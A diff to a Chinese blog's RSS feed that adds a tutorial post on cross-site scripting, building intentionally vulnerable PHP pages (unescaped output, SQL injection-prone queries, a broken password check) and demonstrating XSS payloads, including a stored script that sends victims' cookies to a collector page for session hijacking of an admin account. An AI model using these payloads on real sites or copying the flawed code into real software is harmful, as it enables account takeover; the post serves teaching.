@@ -6,8 +6,514 @@
     <description>Recent content in Post-rsses on 微端生活</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-CN</language>
-    <lastBuildDate>Thu, 17 Dec 2015 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 24 Oct 2016 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://www.yuzhan.me/post/feed/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>网络安全之XSS（一）--攻击篇</title>
+      <link>http://www.yuzhan.me/post/2016-10-25-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B9%8BXSS%EF%BC%88%E4%B8%80%EF%BC%89--%E6%94%BB%E5%87%BB%E7%AF%87/</link>
+      <pubDate>Mon, 24 Oct 2016 00:00:00 +0000</pubDate>
+      
+      <guid>http://www.yuzhan.me/post/2016-10-25-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B9%8BXSS%EF%BC%88%E4%B8%80%EF%BC%89--%E6%94%BB%E5%87%BB%E7%AF%87/</guid>
+      <description>
+
+&lt;h2 id=&#34;什么是xss&#34;&gt;什么是XSS&lt;/h2&gt;
+
+&lt;p&gt;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。&lt;/p&gt;
+
+&lt;h3 id=&#34;攻击类型分类&#34;&gt;攻击类型分类&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;（反射型）非持久型攻击&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。&lt;/p&gt;
+&lt;/blockquote&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;（存储型）持久型攻击&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。&lt;/p&gt;
+&lt;/blockquote&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;反射型xss简单举例&#34;&gt;反射型XSS简单举例&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;由于谷歌内核浏览器有部分xss防御功能，因此以下的操作均使用ie浏览器进行&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;搭建一个简单的页面&#34;&gt;搭建一个简单的页面&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
+    &amp;lt;head&amp;gt; 
+        &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 
+        &amp;lt;title&amp;gt;XSS测试&amp;lt;/title&amp;gt; 
+    &amp;lt;/head&amp;gt; 
+    &amp;lt;body&amp;gt; 
+        &amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt; 
+            &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;xss_input&amp;quot;&amp;gt; 
+            &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt; 
+        &amp;lt;/form&amp;gt; 
+        &amp;lt;a href=&amp;quot;http://www.yuzhan.me&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;Click to view a new site&amp;lt;/a&amp;gt;
+        &amp;lt;hr/&amp;gt; 
+        &amp;lt;?php 
+            $xss = $_GET[&#39;xss_input&#39;];  
+            echo &#39;你输入的字符为&amp;lt;br&amp;gt;&#39;.$xss;  
+        ?&amp;gt; 
+    &amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;界面效果：&lt;br /&gt;
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_page.png&#34; alt=&#34;页面初步效果&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;标准输入-和xss攻击&#34;&gt;标准输入，和XSS攻击&lt;/h3&gt;
+
+&lt;p&gt;我们试着输入&amp;rdquo;标准输入测试&amp;rdquo;，得到的结果为：&lt;br /&gt;
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_page.png&#34; alt=&#34;标准输入测试&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;输入的字符被显示出来。假设输入如下代码：&lt;br /&gt;
+&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;xss攻击测试&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;此时显示的结果为：&lt;br /&gt;
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test1.png&#34; alt=&#34;xss攻击测试&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看源码，发现原来输入数据完全嵌入页面中
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test1_source.png&#34; alt=&#34;xss攻击测试源码&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如上图所表示，说明该页面存在XSS漏洞&lt;/p&gt;
+
+&lt;p&gt;如果只是简单的&lt;code&gt;alert&lt;/code&gt;，可能觉得会没有什么大碍。但是改变代码，输入以下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; &amp;lt;script&amp;gt;
+     window.onload = function() {
+        document.getElementsByTagName(&amp;quot;a&amp;quot;)[0].href=&amp;quot;http://www.baidu.com/&amp;quot;;
+     }
+ &amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;点击页面链接，发现连接地址已经改变，跳转到&lt;code&gt;www.baidu.com&lt;/code&gt;了。&lt;/p&gt;
+
+&lt;h3 id=&#34;xss利用输出的环境来构造代码&#34;&gt;XSS利用输出的环境来构造代码&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
+    &amp;lt;head&amp;gt; 
+        &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 
+        &amp;lt;title&amp;gt;XSS利用输出的环境来构造代码&amp;lt;/title&amp;gt; 
+    &amp;lt;/head&amp;gt; 
+    &amp;lt;body&amp;gt; 
+        &amp;lt;center&amp;gt; 
+        &amp;lt;h2&amp;gt;把我们输入的字符串 输出到input里的value属性里&amp;lt;/h2&amp;gt; 
+            &amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt; 
+                &amp;lt;h4&amp;gt;请输入你想显现的字符串&amp;lt;/h4&amp;gt; 
+                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;xss_input_value&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
+                &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt; 
+            &amp;lt;/form&amp;gt; 
+        &amp;lt;hr&amp;gt; 
+        &amp;lt;?php 
+            $xss = $_GET[&#39;xss_input_value&#39;];  
+            if(isset($xss)){  
+                echo &#39;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&#39;.$xss.&#39;&amp;quot;&amp;gt;&#39;;  
+            }else{  
+                echo &#39;&amp;lt;input type=&amp;quot;type&amp;quot;&amp;gt;&#39;;  
+            }  
+        ?&amp;gt; 
+        &amp;lt;/center&amp;gt; 
+    &amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;继续输入上述代码：&lt;br /&gt;
+ &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;xss攻击测试&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;结果并不成功，没有弹出&lt;code&gt;xss攻击测试&lt;/code&gt;，取而代之，要测试的内容，直接显示在&lt;code&gt;input&lt;/code&gt;输入框中。&lt;br /&gt;
+ &lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test2.png&#34; alt=&#34;根据环境构造xss测试一&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;于是查看源码：
+ &lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test2_source.png&#34; alt=&#34;根据环境构造xss测试一源码&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从源码上可以分析,我们想要显示的内容，包含在&lt;code&gt;value&lt;/code&gt;中，因此不能弹出 。&lt;/p&gt;
+
+&lt;p&gt;找到原因就能构造新的攻击方式：&lt;/p&gt;
+
+&lt;p&gt;尝试输入以下代码：
+ &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;xss攻击测试&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;结果成功，界面弹出提示：
+ &lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test3.png&#34; alt=&#34;根据环境构造xss测试二&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看源码，发现上述代码的含义：
+ &lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test3_source.png&#34; alt=&#34;根据环境构造xss测试二源码&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;分析代码含义：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;利用html特性，使用&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;结束&lt;code&gt;value&lt;/code&gt;，然后再&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;xss攻击测试&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;不含标签的xss攻击&#34;&gt;不含标签的XSS攻击&lt;/h3&gt;
+
+&lt;p&gt;再拿刚才的页面做个测试,尝试输入以下代码
+&lt;code&gt;&amp;quot; onclick=&amp;quot;alert(&#39;xss攻击&#39;)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test4_0.png&#34; alt=&#34;根据环境构造xss测试三&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;页面上什么都没有，点击输出框，弹出&lt;code&gt;xss攻击&lt;/code&gt;
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test4.png&#34; alt=&#34;根据环境构造xss测试三&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看源码，发觉输出&lt;code&gt;input&lt;/code&gt;框已经改变
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test4_source.png&#34; alt=&#34;根据环境构造xss测试三源码&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;存储型xss攻击举例&#34;&gt;存储型XSS攻击举例&lt;/h2&gt;
+
+&lt;h3 id=&#34;session背景知识&#34;&gt;session背景知识&lt;/h3&gt;
+
+&lt;h4 id=&#34;什么是session&#34;&gt;什么是session&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Session:在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;session的工作原理&#34;&gt;session的工作原理&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;当一个session第一次被启用时，一个唯一的标识被存储于本地的cookie中。&lt;/li&gt;
+&lt;li&gt;首先使用session_start()函数，PHP从session仓库中加载已经存储的session变量。&lt;/li&gt;
+&lt;li&gt;当执行PHP脚本时，通过使用session_register()函数注册session变量。&lt;/li&gt;
+&lt;li&gt;当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
+
+&lt;h4 id=&#34;创建表&#34;&gt;创建表&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT &#39;自增id&#39;,
+  `username` varchar(10) NOT NULL COMMENT &#39;用户名&#39;,
+  `password` char(32) NOT NULL COMMENT &#39;密码&#39;,
+  `nickname` varchar(255) NOT NULL COMMENT &#39;昵称&#39;,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;插入几行数据&#34;&gt;插入几行数据&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;INSERT INTO `users` VALUES (&#39;1&#39;, &#39;admin&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;, &#39;haha&#39;);
+INSERT INTO `users` VALUES (&#39;2&#39;, &#39;waiting&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;, &#39;kk&#39;);
+INSERT INTO `users` VALUES (&#39;3&#39;, &#39;luna&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;, &#39;lulu&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;创建如下几个文件&#34;&gt;创建如下几个文件&lt;/h4&gt;
+
+&lt;h5 id=&#34;目录结构如下&#34;&gt;目录结构如下：&lt;/h5&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_filetree.png&#34; alt=&#34;存储型XSS攻击测试文件目录结构&#34; /&gt;&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件名&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;login.php&lt;/td&gt;
+&lt;td&gt;用户系统登陆文件&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;list.php&lt;/td&gt;
+&lt;td&gt;用户列表&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;change.php&lt;/td&gt;
+&lt;td&gt;修改昵称，xss攻击入口&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;db.php&lt;/td&gt;
+&lt;td&gt;数据库实用公共类&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;hacker.php&lt;/td&gt;
+&lt;td&gt;xss攻击接收文件，用于收集客户session&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;cookie.txt&lt;/td&gt;
+&lt;td&gt;xss攻击收集信息保存目标地址&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h5 id=&#34;db-php&#34;&gt;db.php&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class Db
+{
+
+    protected $db;
+
+    public function __construct($config)
+    {
+
+        $this-&amp;gt;db = new mysqli($config[&#39;host&#39;],$config[&#39;username&#39;],$config[&#39;password&#39;],$config[&#39;dbname&#39;]);
+
+        if ($this-&amp;gt;db-&amp;gt;connect_error) 
+            throw new Exception(&amp;quot;数据库连接错误&amp;quot;);
+        
+
+        if (!$this-&amp;gt;db-&amp;gt;set_charset(&amp;quot;utf8&amp;quot;))
+            throw new Exception(&amp;quot;设置字符集错误&amp;quot;);
+            
+    }   
+
+    public function one($sql)
+    {
+        $res =  $this-&amp;gt;query($sql);
+        return $res-&amp;gt;fetch_row();
+    }
+
+    public function all($sql)
+    {
+        $res =  $this-&amp;gt;query($sql);
+        $data = [];
+
+        while ($row = $res-&amp;gt;fetch_assoc()) {
+            array_push($data, $row);
+        }
+
+        return $data;
+    }
+
+    public function query($sql)
+    {
+        return $this-&amp;gt;db-&amp;gt;query($sql);
+    }
+
+
+    public function __destroy()
+    {
+        $this-&amp;gt;db-&amp;gt;close();
+    }
+}
+
+
+$config = [
+    &#39;host&#39; =&amp;gt; &#39;localhost&#39;,
+    &#39;username&#39; =&amp;gt; &#39;root&#39;,
+    &#39;password&#39; =&amp;gt; &#39;root&#39;,
+    &#39;dbname&#39; =&amp;gt; &#39;test&#39;,
+    &#39;port&#39; =&amp;gt; &#39;3306&#39; 
+];
+
+$db = new Db($config);
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;login-php&#34;&gt;login.php&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+if (isset($_POST[&#39;submit&#39;])) {
+
+    require_once(&#39;db.php&#39;);
+
+    $username = $_POST[&#39;username&#39;];
+    $password = $_POST[&#39;password&#39;];
+
+
+    $sql = &amp;quot;select `password` from `users` where `username` = &#39;{$username}&#39;&amp;quot;;
+
+    $res = $db-&amp;gt;one($sql);
+
+    $dbpassword = $res[0];
+
+    if ($dbpassword = md5($password)) {
+        session_start();
+        $_SESSION[&#39;username&#39;] = $username;
+        header(&amp;quot;location:list.php&amp;quot;);
+    } else {
+        echo &amp;quot;密码错误&amp;quot;;
+    }
+}
+
+
+
+
+
+?&amp;gt;
+&amp;lt;html&amp;gt; 
+    &amp;lt;head&amp;gt; 
+        &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 
+        &amp;lt;title&amp;gt;持久性XSS攻击测试--用户登录&amp;lt;/title&amp;gt; 
+    &amp;lt;/head&amp;gt; 
+    &amp;lt;body&amp;gt; 
+        &amp;lt;center&amp;gt; 
+        &amp;lt;h2&amp;gt;用户登录&amp;lt;/h2&amp;gt; 
+            &amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
+                &amp;lt;h4&amp;gt;请输入用户名密码登陆&amp;lt;/h4&amp;gt; 
+                &amp;lt;label&amp;gt;用户名&amp;lt;/label&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;username&amp;quot;&amp;gt;&amp;lt;br/&amp;gt; 
+                &amp;lt;label&amp;gt;密码&amp;lt;/label&amp;gt;&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;br/&amp;gt; 
+                &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; 
+            &amp;lt;/form&amp;gt; 
+        &amp;lt;hr&amp;gt; 
+        &amp;lt;/center&amp;gt; 
+    &amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;list-php&#34;&gt;list.php&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+session_start();
+
+
+if (!$username = $_SESSION[&#39;username&#39;]) {
+    header(&amp;quot;location:login.php&amp;quot;);
+} 
+
+require_once(&#39;db.php&#39;);
+
+$sql = &amp;quot;select * from users&amp;quot;;
+
+$res = $db-&amp;gt;all($sql);
+
+?&amp;gt;
+&amp;lt;html&amp;gt; 
+    &amp;lt;head&amp;gt; 
+        &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 
+        &amp;lt;title&amp;gt;持久性XSS攻击测试--用户信息列表&amp;lt;/title&amp;gt; 
+    &amp;lt;/head&amp;gt; 
+    &amp;lt;body&amp;gt; 
+        &amp;lt;center&amp;gt; 
+        &amp;lt;h2&amp;gt;用户信息列表&amp;lt;/h2&amp;gt;&amp;lt;a href=&amp;quot;change.php&amp;quot;&amp;gt;修改昵称&amp;lt;/a&amp;gt; 
+            &amp;lt;table border=&amp;quot;1&amp;quot; cellspacing=&amp;quot;1&amp;quot;&amp;gt;
+                &amp;lt;tr&amp;gt;
+                    &amp;lt;th&amp;gt;id&amp;lt;/th&amp;gt;
+                    &amp;lt;th&amp;gt;用户名&amp;lt;/th&amp;gt;
+                    &amp;lt;th&amp;gt;昵称&amp;lt;/th&amp;gt;
+                &amp;lt;/tr&amp;gt;
+                &amp;lt;?php
+                    foreach ($res as $value) {
+                        printf(&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;, $value[&#39;id&#39;], $value[&#39;username&#39;], $value[&#39;nickname&#39;]);
+                    }
+                ?&amp;gt;
+            &amp;lt;/table&amp;gt;
+        &amp;lt;/center&amp;gt; 
+    &amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;change-php-xss攻击入口&#34;&gt;change.php(XSS攻击入口)&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+session_start();
+
+require_once(&#39;db.php&#39;);
+
+if (!$username = $_SESSION[&#39;username&#39;]) {
+    header(&amp;quot;location:login.php&amp;quot;);
+} else {
+    if (isset($_POST[&#39;submit&#39;])) {
+
+        $nickname = $_POST[&amp;quot;nickname&amp;quot;];
+
+        $sql = &amp;quot;update users set nickname=&#39;{$nickname}&#39; where username=&#39;{$username}&#39;&amp;quot;;
+
+        echo $sql;
+        
+        $res = $db-&amp;gt;query($sql);
+
+        echo &amp;quot;更新成功&amp;quot;;
+    }
+}
+
+?&amp;gt;
+
+&amp;lt;html&amp;gt; 
+    &amp;lt;head&amp;gt; 
+        &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 
+        &amp;lt;title&amp;gt;持久性XSS攻击测试--用户登录&amp;lt;/title&amp;gt; 
+    &amp;lt;/head&amp;gt; 
+    &amp;lt;body&amp;gt; 
+        &amp;lt;center&amp;gt; 
+        &amp;lt;h2&amp;gt;用户登录&amp;lt;/h2&amp;gt; 
+            &amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
+                &amp;lt;h4&amp;gt;请输入新昵称&amp;lt;/h4&amp;gt; 
+                &amp;lt;label&amp;gt;新昵称&amp;lt;/label&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;nickname&amp;quot;&amp;gt;&amp;lt;br/&amp;gt; 
+                &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; 
+            &amp;lt;/form&amp;gt; 
+        &amp;lt;hr&amp;gt; 
+        &amp;lt;/center&amp;gt; 
+    &amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;hacker-php&#34;&gt;hacker.php&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$cookie = $_GET[&#39;cookie&#39;];
+
+file_put_contents(&amp;quot;cookie.txt&amp;quot;, $cookie);
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;演示&#34;&gt;演示&lt;/h4&gt;
+
+&lt;h4 id=&#34;利用普通用户登陆系统&#34;&gt;利用普通用户登陆系统&lt;/h4&gt;
+
+&lt;p&gt;此处，使用&lt;code&gt;luna&lt;/code&gt;,密码&lt;code&gt;123456&lt;/code&gt;。这里的用户是任意一个普通用户的。
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_login.png&#34; alt=&#34;存储型XSS攻击测试文件目录结构&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;输入xss攻击代码&#34;&gt;输入XSS攻击代码&lt;/h4&gt;
+
+&lt;p&gt;进入修改昵称界面，输入&lt;code&gt;XSS&lt;/code&gt;攻击代码。此处输入的XSS代码，是根据以上文件的漏洞而写的。实际应用中，可能需要各种手段去处理，但是不再本文范围之内，就不多讨论了。
+&lt;code&gt;&amp;lt;script&amp;gt;window.onload = function(){ window.location.href = &amp;quot;hacker.php?cookie=&amp;quot; + document.cookie; }&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;点击提交，发觉数据库内容已经更改，xss攻击已经存储进数据库
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_msyqldata.png&#34; alt=&#34;存储型XSS攻击存储数据&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;等待用户上钩&#34;&gt;等待用户上钩&lt;/h4&gt;
+
+&lt;p&gt;当用户进入&lt;code&gt;list.php&lt;/code&gt;，会自动跳转到预先写好的&lt;strong&gt;收集&lt;/strong&gt;界面。&lt;br /&gt;
+这里，如果是&lt;code&gt;admin&lt;/code&gt;用户来使用系统，就可以获取其重要信息。
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_adminlogin.png&#34; alt=&#34;存储型XSS攻击管理员登陆&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;登陆系统，直接跳转至收集页面
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_admin_redirection.png&#34; alt=&#34;存储型XSS攻击管理员登陆&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;利用收集的信息操作&#34;&gt;利用收集的信息操作&lt;/h4&gt;
+
+&lt;p&gt;查看&lt;code&gt;cookie.txt&lt;/code&gt;文件，发觉已经收集到相关信息:&lt;br /&gt;
+&lt;code&gt;PHPSESSID=ruolpn1lt58j6es7smrnbeu217&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;于是，修改&lt;code&gt;cookie&lt;/code&gt;,我们目前就是&lt;code&gt;admin&lt;/code&gt;的身份。
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_changecookie.png&#34; alt=&#34;存储型XSS攻击修改cookie&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;尝试修改自己的昵称
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_luna_xss.png&#34; alt=&#34;存储型XSS攻击修改管理员昵称&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;结果很不客气的修改了管理员的昵称
+&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2016/10/xss_attack_test5_luna_xss_result.png&#34; alt=&#34;存储型XSS攻击修改管理员昵称结果&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+
+&lt;p&gt;这一小节，主要举例存储型XSS攻击。这一类攻击，如我们演示的，可能会对系统造成很大的灾难。下一篇，就介绍一下如何防止XSS攻击&lt;/p&gt;
+
+&lt;h2 id=&#34;相关资料&#34;&gt;相关资料&lt;/h2&gt;
+
+&lt;h3 id=&#34;xss相关资料&#34;&gt;xss相关资料&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/jackmasa/XSS.png.git&#34;&gt;xss相关攻击代码整理&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>github pages 博客搭建</title>
@@ -27,7 +533,7 @@
 
 &lt;h2 id=&#34;操作说明&#34;&gt;操作说明：&lt;/h2&gt;
 
-&lt;h3 id=&#34;1-环境准备&#34;&gt;1 环境准备&lt;/h3&gt;
+&lt;h3 id=&#34;环境准备&#34;&gt;环境准备&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;系统： &lt;code&gt;Linux(ubuntu)&lt;/code&gt;,&lt;code&gt;Mac OS&lt;/code&gt;,&lt;code&gt;Windows&lt;/code&gt;(不推荐使用)&lt;/li&gt;
@@ -35,7 +541,7 @@
 &lt;li&gt;平台： &lt;code&gt;github&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&#34;2-项目创建&#34;&gt;2 项目创建&lt;/h3&gt;
+&lt;h3 id=&#34;项目创建&#34;&gt;项目创建&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;在&lt;code&gt;github&lt;/code&gt;上创建新仓库，命名为: &lt;code&gt;username.github.io&lt;/code&gt;
@@ -62,7 +568,7 @@
 &lt;li&gt;访问页面 &lt;code&gt;http://username.github.io&lt;/code&gt; 则显示刚写入文件的信息&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&#34;3-本地环境创建-以ubuntu为参考&#34;&gt;3 本地环境创建（以ubuntu为参考）&lt;/h3&gt;
+&lt;h3 id=&#34;本地环境创建-以ubuntu为参考&#34;&gt;本地环境创建（以ubuntu为参考）&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;安装&lt;code&gt;ruby-install&lt;/code&gt;，此用于安装ruby环境&lt;/p&gt;
@@ -110,7 +616,7 @@ https://ruby.taobao.org
 
 &lt;p&gt;至此，环境搭建完成&lt;/p&gt;
 
